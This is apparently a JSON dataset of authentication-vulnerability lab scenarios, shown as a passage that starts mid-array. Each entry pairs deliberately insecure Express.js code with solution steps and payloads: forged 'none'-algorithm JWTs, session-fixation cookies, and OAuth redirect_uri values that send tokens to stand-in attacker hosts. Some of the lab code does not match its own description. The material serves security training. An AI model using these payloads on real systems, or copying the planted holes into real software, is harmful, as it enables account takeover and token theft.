  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { const authUrl = 'https://oauth.provider.com/auth?client_id=123&redirect_uri=http://localhost:4000/auth/callback'; res.redirect(authUrl); }); app.get('/auth/callback', (req, res) => { const userInfo = { username: 'carlos' }; req.session.user = userInfo; console.log('[DEBUG] Auth callback session:', req.session); res.redirect('/dashboard'); }); app.get('/dashboard', (req, res) => { if (!req.session.user) return res.status(401).send('Unauthorized'); res.send('Welcome to your dashboard, ' + req.session.user.username); }); app.listen(4000, () => console.log('OAuth Session Fixation Lab running'));",
  "payloads": [
    "Set-Cookie: connect.sid=sess:fixed123",
    "https://labsite.com/auth/callback?code=xyz (with injected session ID)",
    "Burp Collaborator + social engineering redirect to /auth/callback"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL Login API",
  "Lab Description": "This lab uses JSON Web Tokens to protect user sessions. However, the backend incorrectly allows tokens signed with the 'none' algorithm. To solve: Forge a JWT with 'alg':'none' and impersonate the victim user to access their GraphQL profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to perform a valid login and retrieve your JWT from the Authorization header.",
    "2. Decode the JWT in jwt.io or Burp Decoder and observe the algorithm field.",
    "3. Replace the JWT header with {\"alg\":\"none\",\"typ\":\"JWT\"} and payload with {\"username\":\"carlos\"}.",
    "4. Remove the signature completely and send the token via Authorization: Bearer header to /graphql.",
    "5. Query the victim’s profile using: { userProfile { username, email, balance } }"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); console.log('[DEBUG] Issued JWT:', token); res.json({ token }); }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { const user = { username: req.body.query.includes('carlos') ? 'carlos' : 'anonymous' }; return res.json({ data: { userProfile: { username: user.username, email: user.username + '@example.com', balance: 100 } } }); } try { const verified = jwt.verify(token, SECRET); res.json({ data: { userProfile: { username: verified.username, email: verified.username + '@example.com', balance: 100 } } }); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "{ userProfile { username, email, balance } }",
    "Authorization: Bearer <none-alg-token>"
  ]
},
{
  "Lab scenario": "SOAP API Key Leakage via Verbose Debugging in MFA Bypass",
  "Lab Description": "This lab uses a SOAP API for multi-factor authentication. The application logs sensitive API keys in verbose mode. By inducing an error during MFA verification, an attacker can leak the victim’s API key. To solve: Trigger the debug message, extract the key, and bypass MFA for the victim.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the SOAP MFA login request and replay it with a malformed payload.",
    "2. Analyze the HTTP 500 error response containing the verbose debug trace leaking 'apiKey' for the victim.",
    "3. Replay the correct SOAP request with the leaked API key and valid credentials to bypass MFA.",
    "4. Access the SOAP getUserProfile operation with victim credentials and leaked key.",
    "5. Confirm successful bypass by querying the MyAccount page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const morgan = require('morgan'); app.use(bodyParser.text({ type: 'text/xml' })); app.use(morgan('dev')); app.post('/soap-mfa', (req, res) => { try { if (req.body.includes('<Username>carlos</Username>') && req.body.includes('<ApiKey>DEBUG_LEAK_KEY</ApiKey>')) { res.send('<soap:Envelope><soap:Body><AuthResult>Success</AuthResult></soap:Body></soap:Envelope>'); } else if (req.body.includes('<Username>carlos</Username>')) { throw new Error('Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY'); } else { res.status(403).send('<soap:Envelope><soap:Body><AuthResult>Failure</AuthResult></soap:Body></soap:Envelope>'); } } catch (e) { console.log('[DEBUG] Exception:', e.message); res.status(500).send(e.message); } }); app.listen(4000, () => console.log('SOAP MFA Bypass Lab running'));",
  "payloads": [
    "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username><ApiKey>DEBUG_LEAK_KEY</ApiKey></MFARequest></soap:Body></soap:Envelope>",
    "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username></MFARequest></soap:Body></soap:Envelope>",
    "500 error leak: Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY"
  ]
},
{
  "Lab scenario": "Session Fixation in REST API session management",
  "Lab Description": "The application uses predictable session tokens stored in a REST cookie without invalidation upon login. The vulnerable login process does not reset the session token after authentication. To solve: Fixate a session and hijack Carlos's authenticated session using the same token.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept login flow in Burp Suite using Proxy and identify the session cookie behavior.",
    "Use OWASP ZAP to confirm that session cookie remains unchanged before and after login.",
    "Manually send a GET /login request to establish a session and capture the session cookie.",
    "Send a crafted phishing link containing the session ID to Carlos (simulated).",
    "Once Carlos logs in, reuse the same session cookie to access /my-account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'insecureSecret', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; console.log(`[DEBUG] User ${username} logged in using session ID ${req.session.id}`); res.redirect('/my-account'); } else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page of ${req.session.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /login -> extract session cookie",
    "Session cookie: sessionid=fixatedSession123",
    "Use session cookie after Carlos logs in: GET /my-account"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL auth mutation",
  "Lab Description": "The application uses JWT to protect a GraphQL mutation-based login but accepts the 'none' algorithm for tokens. To solve: Forge a valid token by removing the signature and gain access to the admin GraphQL endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture the Authorization header on login mutation.",
    "Decode the JWT using jwt.io and confirm 'alg':'none' is accepted.",
    "Craft a JWT token with 'alg':'none' and payload {\"username\":\"carlos\",\"role\":\"admin\"}.",
    "Send the token via Authorization: Bearer <crafted_token> in a GraphQL POST request.",
    "Query the getAdminData endpoint using Postman with the forged JWT to confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') return res.send({ data: 'Sensitive admin content' }); res.status(403).send('Access denied'); } catch (err) { console.log('[DEBUG] JWT Error:', err.message); res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "JWT: base64(header).base64(payload).",
    "Authorization: Bearer [token]"
  ]
},
{
  "Lab scenario": "OAuth token hijack via open redirect URI",
  "Lab Description": "The application uses OAuth 2.0 for authentication, but the token redirect URI is improperly validated. This allows attackers to hijack access tokens. To solve: Craft a redirect URI to leak Carlos's token and use it to access protected resources.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth authorization flow and inspect the redirect_uri.",
    "Modify the redirect_uri to point to your controlled domain (e.g., attacker.com).",
    "Simulate Carlos initiating OAuth login using this crafted URL.",
    "Capture the leaked access_token in your attacker server logs.",
    "Replay the access_token in the Authorization header to access /my-account API."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const token = 'token-' + Math.random().toString(36).substring(7); tokens['carlos'] = token; console.log(`[DEBUG] Issued token ${token} for redirect URI ${redirect_uri}`); res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&state=xyz",
    "Intercept token in attacker.com logs",
    "GET /my-account with Authorization: Bearer token-xxxx"
  ]
},
{
  "Lab scenario": "2FA bypass via duplicate parameters in SOAP login request",
  "Lab Description": "A SOAP-based login API expects a 2FA code, but fails when multiple <2faCode> elements are submitted. The first one is ignored, and the second is trusted. To solve: Inject duplicate 2FA parameters and force authentication without a valid code.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to proxy a SOAP login request and extract the WSDL and SOAP body.",
    "Send the login request to Burp Repeater and test with valid credentials but invalid 2FA code.",
    "Add a second <2faCode> element after the first, leaving the second one empty.",
    "Observe that the backend uses the last occurrence, bypassing validation.",
    "Replay the bypass request and confirm access to /my-account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); const users = [{ username: 'carlos', password: 'admin', code: '654321' }]; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]; const { username, password, '2faCode': code } = body.loginRequest[0]; if (username[0] === 'carlos' && password[0] === 'admin' && code[0] === '654321') res.send('<success>Logged in</success>'); else res.status(403).send('<error>Invalid login</error>'); }); app.get('/my-account', (req, res) => { res.send('Carlos account info'); }); app.listen(4000);",
  "payloads": [
    "<2faCode>invalid</2faCode><2faCode></2faCode>",
    "SOAPAction: /soap-login",
    "Username: carlos, Password: admin"
  ]
},
{
  "Lab scenario": "Session Fixation in legacy SOAP endpoint",
  "Lab Description": "The application uses a legacy SOAP authentication endpoint vulnerable to session fixation. The session ID can be preset and is accepted post-login. The application does not regenerate session tokens upon authentication. To solve: fix a session ID, authenticate as Carlos, and access his dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the GET /login request and observe the Set-Cookie header.",
    "Send a crafted SOAP login request using Postman with the JSESSIONID manually set to the fixed value.",
    "Submit the SOAP authentication request as Carlos with known credentials.",
    "Verify that the server accepts the fixed JSESSIONID without regenerating it post-login.",
    "Use the fixed session cookie to access /dashboard as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const soap = require('soap'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carpass' }]; app.post('/soap-auth', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.username = username; res.send(`<response>Login successful</response>`); }); app.get('/dashboard', (req, res) => { if (req.session.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "<soap:Envelope><soap:Body><Login><username>carlos</username><password>carpass</password></Login></soap:Body></soap:Envelope>",
    "Cookie: JSESSIONID=FIXED123",
    "POST /soap-auth with pre-set JSESSIONID"
  ]
},
{
  "Lab scenario": "JWT tampering in GraphQL login resolver",
  "Lab Description": "The GraphQL login resolver issues JWT tokens signed with the 'none' algorithm when 'alg' is tampered in the header. The backend uses a misconfigured JWT library that does not enforce algorithm validation. To solve: craft a JWT with 'alg':'none', impersonate Carlos, and access /profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to query the GraphQL login resolver with your credentials and observe the JWT structure.",
    "Decode the JWT using jwt.io and inspect its header and payload.",
    "Create a new JWT with 'alg':'none' and 'username':'carlos', leaving signature blank.",
    "Send the forged JWT in Authorization: Bearer header to /profile endpoint.",
    "Verify access to Carlos's profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { token } }); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(auth, { complete: true }); if (decoded?.payload?.username === 'carlos') res.send('Carlos Profile'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
    "Authorization: Bearer [forged-token]",
    "GraphQL query: mutation { login(username: \"wiener\", password: \"test\") }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri",
  "Lab Description": "The application implements OAuth Implicit Grant but fails to validate redirect_uri strictly. It allows open redirect injection, enabling token capture. To solve: trick the auth server to redirect Carlos's token to your server and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to analyze the OAuth authorization URL and notice insufficient redirect_uri validation.",
    "Craft a malicious redirect_uri to your attacker-controlled server (e.g., https://attacker.com/capture).",
    "Trick Carlos into visiting the malicious OAuth URL via phishing or reflection injection.",
    "Capture the access_token from the redirected URL fragment.",
    "Replay the token in Authorization header to access /user/profile as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'carlos-access-token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') res.send('Carlos Profile'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "https://vulnerable.com/auth?redirect_uri=https://attacker.com/capture",
    "Captured token: carlos-access-token",
    "Authorization: Bearer carlos-access-token"
  ]
},
{
  "Lab scenario": "Session ID leakage in verbose debug logs",
  "Lab Description": "The application exposes internal debug logs via a REST endpoint. These logs contain session tokens in plaintext due to poor log filtering. To solve: extract Carlos’s session ID from logs and use it to access /my-account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to access the /debug/logs REST endpoint.",
    "Search for session tokens and correlate them with Carlos's login attempts.",
    "Identify a valid session token assigned to Carlos from the logs.",
    "Replay a GET /my-account request with Cookie: session=<carlos_token>.",
    "Confirm access to Carlos’s account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const logs = []; app.use(session({ secret: 'debug-secret', saveUninitialized: true, resave: false })); app.post('/login', (req, res) => { const { username } = req.body; req.session.user = username; logs.push(`[DEBUG] Login by ${username}, session: ${req.session.id}`); res.send('Logged in'); }); app.get('/debug/logs', (req, res) => { res.send(logs.join('\\n')); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
  "payloads": [
    "GET /debug/logs",
    "Extracted: session=abcd123carlos",
    "Cookie: session=abcd123carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in Legacy Cookie Management via REST Login",
  "Lab Description": "The application uses legacy cookie-based session management without proper regeneration of session identifiers after login. The session cookie is issued pre-authentication and persists after login without changes. To solve: Fixate a session ID pre-login, then log in as the victim using that ID to hijack their session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a GET /login request using Burp Suite to extract the Set-Cookie header and capture the pre-auth session ID.",
    "Verify that logging in does not rotate the session cookie by logging in with your credentials while preserving the original cookie.",
    "Craft a phishing-style exploit where the victim logs in while fixated to your session ID. Simulate this by sending a login request with victim credentials and your pre-captured cookie using Burp Repeater.",
    "After login, issue a GET /my-account request with the same cookie to verify session takeover.",
    "Confirm access to victim’s account page using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'legacysecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); req.session.authenticated = true; req.session.user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) return res.send('Account details for ' + req.session.user); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab on http://localhost:4000'));",
  "payloads": [
    "Reuse pre-authentication cookie after victim login",
    "Fixate session ID via phishing link",
    "GET /my-account with hijacked session ID"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in GraphQL Login Token",
  "Lab Description": "The application uses JWTs for authentication with user-supplied tokens via Authorization headers. The token signature verification logic fails to enforce a valid signing algorithm. To solve: Forge a JWT using 'alg':'none' and impersonate the victim by submitting it to a protected GraphQL query.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to perform a GraphQL login mutation and inspect the returned JWT in the Authorization header.",
    "Decode the JWT in jwt.io and observe it uses HS256 or RS256 with a signed payload.",
    "Forge a new token using the same payload but with alg set to 'none' and remove the signature section entirely.",
    "Submit the tampered token in the Authorization header and perform a GraphQL query like { me { username, email } }.",
    "Verify that the server accepts the token and returns Carlos's information."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpassword' }]; const schema = buildSchema(`type Query { me: User } type User { username: String, email: String }`); const root = { me: (args, context) => { if (!context.user) throw new Error('Unauthorized'); return { username: context.user.username, email: context.user.username + '@corp.local' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, 'jwtsecret'); } catch (e) { console.error('JWT verification failed:', e); } } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'jwtsecret'); res.json({ token }); }); app.listen(4001, () => console.log('JWT None Alg Lab running on http://localhost:4001'));",
  "payloads": [
    "JWT with header { \"alg\": \"none\" }, no signature",
    "Authorization: Bearer <none-alg-token>",
    "GraphQL query { me { username } }"
  ]
},
{
  "Lab scenario": "OAuth Redirect URI Manipulation in REST Authorization Flow",
  "Lab Description": "The application integrates OAuth for login via a third-party provider. However, the redirect_uri parameter is not properly validated during the authorization flow. To solve: Manipulate the redirect_uri to point to an attacker-controlled page and capture the authorization code to impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate an OAuth login and intercept the authorization request to the third-party provider.",
    "Note the redirect_uri parameter in the request. Modify it to point to a controlled domain (e.g., https://attacker.net/callback).",
    "Forward the modified request and log the authorization code received at the attacker domain (simulate it in Burp Collaborator).",
    "Use the captured code to perform the token exchange manually via Postman (POST /oauth/token with code and client credentials).",
    "Use the access_token to query the authenticated API endpoint and confirm Carlos’s identity."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code } = req.query; if (!code) return res.status(400).send('Missing code'); try { const tokenRes = await axios.post('https://provider.com/oauth/token', { code, client_id: 'client123', client_secret: 'secret456', redirect_uri: req.protocol + '://' + req.get('host') + req.originalUrl }); const accessToken = tokenRes.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: 'Bearer ' + accessToken } }); res.send('Welcome, ' + userInfo.data.username); } catch (e) { console.error('OAuth error:', e); res.status(500).send('OAuth failed'); } }); app.listen(4002, () => console.log('OAuth Redirect URI Lab running on http://localhost:4002'));",
  "payloads": [
    "redirect_uri=https://attacker.net/callback",
    "Capture code via redirected OAuth flow",
    "POST /oauth/token with stolen code"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP-based Login Endpoint",
  "Lab Description": "This lab's SOAP-based login API suffers from a session fixation vulnerability due to insecure session token handling. The application assigns a session ID before user authentication and does not renew it after login, allowing attackers to hijack user sessions. To solve: hijack Carlos's session and access his account page.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the initial unauthenticated SOAP login request and note the Set-Cookie response.",
    "2. Manually set the session cookie to a known value using Postman and perform the login with Carlos's credentials.",
    "3. Observe that the session token remains unchanged even after successful login, confirming fixation.",
    "4. Send the crafted session cookie to your browser and reuse it to access /my-account.",
    "5. Confirm access to Carlos's session by visiting the protected account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein123' }]; app.post('/soap-login', (req, res) => { let sessionId = req.cookies['sid'] || Math.random().toString(36).slice(2); res.cookie('sid', sessionId); const match = req.body.match(/<username>(.*)<\\/username>.*<password>(.*)<\\/password>/); if (match && match[1] === 'carlos' && match[2] === 'letmein123') { res.send(`<soap:Envelope><soap:Body><status>Login successful</status></soap:Body></soap:Envelope>`); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'fixated-session') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('SOAP Session Fixation running'));",
  "payloads": [
    "<soapenv:Envelope><soapenv:Body><username>carlos</username><password>letmein123</password></soapenv:Body></soapenv:Envelope>",
    "Cookie: sid=fixated-session",
    "GET /my-account HTTP/1.1"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL Login Token Handling",
  "Lab Description": "The application's GraphQL login system uses JWTs for session management but fails to validate the algorithm securely. The JWT library accepts tokens signed with 'alg':'none', allowing an attacker to forge tokens. To solve: forge a valid JWT to impersonate Carlos and access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the login GraphQL mutation and obtain a valid JWT after authenticating as a normal user.",
    "2. Decode the JWT using jwt.io and note the algorithm is 'HS256'.",
    "3. Modify the JWT to set 'alg':'none' and change 'username':'carlos' in the payload.",
    "4. Remove the signature part entirely, rebase64-encode, and send the token in the Authorization header.",
    "5. Access /graphql with query {myAccount} and confirm the forged token grants Carlos's access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { login: token } }); } else if (query.includes('myAccount')) { const auth = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(auth, { complete: true }); if (payload?.payload?.username === 'carlos') { res.json({ data: { myAccount: 'Sensitive info of carlos' } }); } else { res.status(403).json({ error: 'Unauthorized' }); } } }); app.listen(4000, () => console.log('GraphQL JWT Tampering running'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <forged_none_jwt>",
    "POST /graphql {\"query\":\"{myAccount}\"}"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Authorization Code Flow",
  "Lab Description": "The application uses OAuth with an external provider, but the authorization code is not properly bound to the client ID. This allows attackers to inject a stolen code into the REST /oauth-callback endpoint. To solve: perform an authorization code injection to hijack Carlos's OAuth session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the OAuth redirect and note the authorization code parameter in the /oauth-callback endpoint.",
    "2. Log in as your own user and capture your code during the OAuth flow.",
    "3. Send a malicious GET request to /oauth-callback using Carlos's session and your captured code.",
    "4. Observe that the code is accepted and your session now links to Carlos's account due to insecure client validation.",
    "5. Visit /my-account to confirm you're logged in as Carlos and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const axios = require('axios'); const app = express(); app.use(session({ secret: 'oauth-lab', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=lab-app&redirect_uri=http://localhost:4000/oauth-callback`); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); req.session.user = userInfo.data.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('OAuth account access: carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Confusion Lab running'));",
  "payloads": [
    "GET /oauth-callback?code=attacker_code_stolen_via_replay HTTP/1.1",
    "GET /my-account HTTP/1.1",
    "Modify Authorization Code in redirected request using Burp Repeater"
  ]
}
]

